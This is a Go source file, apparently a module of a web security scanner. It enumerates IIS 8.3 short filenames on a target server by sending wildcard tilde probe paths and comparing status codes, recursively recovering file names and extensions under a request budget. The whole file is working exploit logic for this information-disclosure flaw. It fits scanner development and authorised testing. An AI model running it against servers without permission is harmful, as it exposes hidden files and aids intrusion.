package iis_shortname_discovery

import (
	"fmt"
	"strings"

	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"go.uber.org/zap"
)

// defaultCharset is the character set used for enumeration, ordered by frequency.
const defaultCharset = "JFKGOTMYVHSPCANDXLRWEBQUIZ8549176320-_"

const (
	maxFileLen = 6 // 8.3 filename part (without tilde suffix)
	maxExtLen  = 3 // 8.3 extension part
)

// shortFile represents a discovered 8.3 short filename.
type shortFile struct {
	file  string // filename part (up to 6 chars)
	tilde string // e.g., "~1"
	ext   string // extension part (up to 3 chars)
}

// String returns the full 8.3 representation.
func (sf shortFile) String() string {
	if sf.ext != "" {
		return sf.file + sf.tilde + "." + sf.ext
	}
	return sf.file + sf.tilde
}

// requestBudget tracks and caps request count.
type requestBudget struct {
	count int
	max   int
}

func newRequestBudget(max int) *requestBudget {
	return &requestBudget{max: max}
}

func (rb *requestBudget) inc()            { rb.count++ }
func (rb *requestBudget) exhausted() bool { return rb.count >= rb.max }

// charMap holds discovered characters per tilde level.
type charMap struct {
	fileChars map[int]string // tildeLevel -> valid chars for filename
	extChars  map[int]string // tildeLevel -> valid chars for extension
}

// discoverCharacters determines which characters appear in short filenames
// at the target, reducing the brute-force search space.
func discoverCharacters(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	basePath string,
	o *oracle,
	reqBudget *requestBudget,
) *charMap {
	cm := &charMap{
		fileChars: make(map[int]string),
		extChars:  make(map[int]string),
	}

	for _, tilde := range o.tildes {
		var fileChars, extChars strings.Builder

		for _, ch := range defaultCharset {
			if reqBudget.exhausted() {
				break
			}

			char := string(ch)

			// Test filename character: *<char>*~<N>*
			filePath := basePath + pathEscape("*"+char+"*~"+fmt.Sprintf("%d", tilde)+"*") + o.suffix
			reqBudget.inc()
			status, err := sendProbe(ctx, httpClient, o.method, filePath)
			if err == nil && status != o.statusNeg {
				fileChars.WriteString(char)
			}

			if reqBudget.exhausted() {
				break
			}

			// Test extension character: *~<N>*<char>*
			extPath := basePath + pathEscape("*~"+fmt.Sprintf("%d", tilde)+"*"+char+"*") + o.suffix
			reqBudget.inc()
			status, err = sendProbe(ctx, httpClient, o.method, extPath)
			if err == nil && status != o.statusNeg {
				extChars.WriteString(char)
			}
		}

		cm.fileChars[tilde] = fileChars.String()
		cm.extChars[tilde] = extChars.String()

		zap.L().Debug("IISShortname: character discovery",
			zap.Int("tilde", tilde),
			zap.String("fileChars", cm.fileChars[tilde]),
			zap.String("extChars", cm.extChars[tilde]),
		)
	}

	return cm
}

// enumerate recursively discovers all 8.3 short filenames for the target.
func enumerate(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	basePath string,
	o *oracle,
	cm *charMap,
	reqBudget *requestBudget,
) []shortFile {
	var results []shortFile

	for _, tilde := range o.tildes {
		tildeStr := fmt.Sprintf("~%d", tilde)
		fChars := cm.fileChars[tilde]
		eChars := cm.extChars[tilde]

		if fChars == "" {
			continue
		}

		found := enumerateFileNames(ctx, httpClient, basePath, o, tildeStr, "", fChars, reqBudget)
		for _, fileName := range found {
			if eChars == "" {
				results = append(results, shortFile{file: fileName, tilde: tildeStr})
				continue
			}
			exts := enumerateExtensions(ctx, httpClient, basePath, o, tildeStr, fileName, eChars, reqBudget)
			if len(exts) == 0 {
				results = append(results, shortFile{file: fileName, tilde: tildeStr})
			}
			for _, ext := range exts {
				results = append(results, shortFile{file: fileName, tilde: tildeStr, ext: ext})
			}
		}
	}

	return results
}

// enumerateFileNames recursively discovers filename parts.
func enumerateFileNames(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	basePath string,
	o *oracle,
	tilde, prefix, chars string,
	reqBudget *requestBudget,
) []string {
	var results []string

	for _, ch := range chars {
		if reqBudget.exhausted() {
			break
		}

		candidate := prefix + string(ch)

		// Handle IIS percent-sign bug: chars after % in 0-F range always match
		testChar := string(ch)
		if testChar == "%" {
			testChar += "??"
		}
		testCandidate := prefix + testChar

		// Test if this character is valid at this position
		probePath := basePath + pathEscape(testCandidate+"*"+tilde+"*") + o.suffix
		reqBudget.inc()
		status, err := sendProbe(ctx, httpClient, o.method, probePath)
		if err != nil || status == o.statusNeg {
			continue
		}

		// Check if filename is complete (without wildcard before tilde)
		if len(candidate) <= maxFileLen {
			reqBudget.inc()
			completePath := basePath + pathEscape(candidate+tilde+"*") + o.suffix
			completeStatus, completeErr := sendProbe(ctx, httpClient, o.method, completePath)
			if completeErr == nil && completeStatus != o.statusNeg {
				results = append(results, candidate)
			}
		}

		// Recurse if we haven't hit the filename length limit
		if len(candidate) < maxFileLen {
			// Check if more characters exist using ? wildcard
			reqBudget.inc()
			morePath := basePath + pathEscape(candidate+"?*"+tilde+"*") + o.suffix
			moreStatus, moreErr := sendProbe(ctx, httpClient, o.method, morePath)
			if moreErr == nil && moreStatus != o.statusNeg {
				deeper := enumerateFileNames(ctx, httpClient, basePath, o, tilde, candidate, chars, reqBudget)
				results = append(results, deeper...)
			}
		}
	}

	return results
}

// enumerateExtensions recursively discovers extension parts.
func enumerateExtensions(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	basePath string,
	o *oracle,
	tilde, fileName, chars string,
	reqBudget *requestBudget,
) []string {
	return enumerateExtensionRecursive(ctx, httpClient, basePath, o, tilde, fileName, "", chars, reqBudget)
}

func enumerateExtensionRecursive(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	basePath string,
	o *oracle,
	tilde, fileName, prefix, chars string,
	reqBudget *requestBudget,
) []string {
	var results []string

	for _, ch := range chars {
		if reqBudget.exhausted() {
			break
		}

		candidate := prefix + string(ch)

		// Test if this extension character is valid
		probePath := basePath + pathEscape(fileName+tilde+"."+candidate+"*") + o.suffix
		reqBudget.inc()
		status, err := sendProbe(ctx, httpClient, o.method, probePath)
		if err != nil || status == o.statusNeg {
			continue
		}

		// Check if extension is complete
		reqBudget.inc()
		completePath := basePath + pathEscape(fileName+tilde+"."+candidate) + o.suffix
		completeStatus, completeErr := sendProbe(ctx, httpClient, o.method, completePath)
		if completeErr == nil && completeStatus != o.statusNeg {
			results = append(results, candidate)
		}

		// Recurse if we haven't hit the extension length limit
		if len(candidate) < maxExtLen {
			reqBudget.inc()
			morePath := basePath + pathEscape(fileName+tilde+"."+candidate+"?*") + o.suffix
			moreStatus, moreErr := sendProbe(ctx, httpClient, o.method, morePath)
			if moreErr == nil && moreStatus != o.statusNeg {
				deeper := enumerateExtensionRecursive(ctx, httpClient, basePath, o, tilde, fileName, candidate, chars, reqBudget)
				results = append(results, deeper...)
			}
		}
	}

	return results
}
